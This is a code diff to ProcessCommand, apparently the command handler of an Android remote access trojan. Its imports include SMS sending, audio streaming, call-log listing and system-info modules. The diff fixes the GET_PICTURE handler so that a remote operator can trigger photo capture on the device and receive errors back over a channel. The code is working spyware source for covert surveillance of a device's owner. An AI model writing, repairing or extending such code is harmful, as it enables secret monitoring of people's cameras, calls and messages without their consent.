@@ -7,9 +7,9 @@ import java.util.Map;
 import java.util.StringTokenizer;
 
 import utils.EncoderHelper;
-
 import Packet.Packet;
 import Packet.PreferencePacket;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -19,7 +19,6 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
-
 import my.app.Library.AdvancedSystemInfo;
 import my.app.Library.AudioStreamer;
 import my.app.Library.CallLogLister;
@@ -44,6 +43,8 @@ public class ProcessCommand
 	SharedPreferences settings;
 	SharedPreferences.Editor editor;
 
+	
+	
 	public ProcessCommand(ClientListener c)
 	{
 		this.client = c;
@@ -51,7 +52,7 @@ public class ProcessCommand
 		editor = settings.edit();
 	}
 
-	public void process(short cmd, byte[] args, int chan)
+	public void process(short cmd, byte[] args, int chan)  //Client service needet to take photo 
 	{
 		this.commande = cmd;
 		this.chan = chan;
@@ -126,11 +127,13 @@ public class ProcessCommand
 		} else if (commande == Protocol.GET_PICTURE)
 		{
 			client.sendInformation("Photo picture request received");
-			//if(client instanceof Client)
-			//	client.sendError("Photo requested from a service (it will probably not work)");
-			//client.photoTaker = new PhotoTaker(client, chan);
-			if (!client.photoTaker.takePhoto())
-				client.sendError("Something went wrong while taking the picture");
+			client.photoTaker = new PhotoTaker(client, chan);
+			try{
+				if (!client.photoTaker.takePhoto())
+					client.sendError("Something went wrong while taking the picture");
+			}catch (Exception e){
+				Log.e("ProcessCommand", "ERROR calling TakePhoto : " + e.toString());
+			}
 			
 		} else if (commande == Protocol.DO_TOAST)
 		{
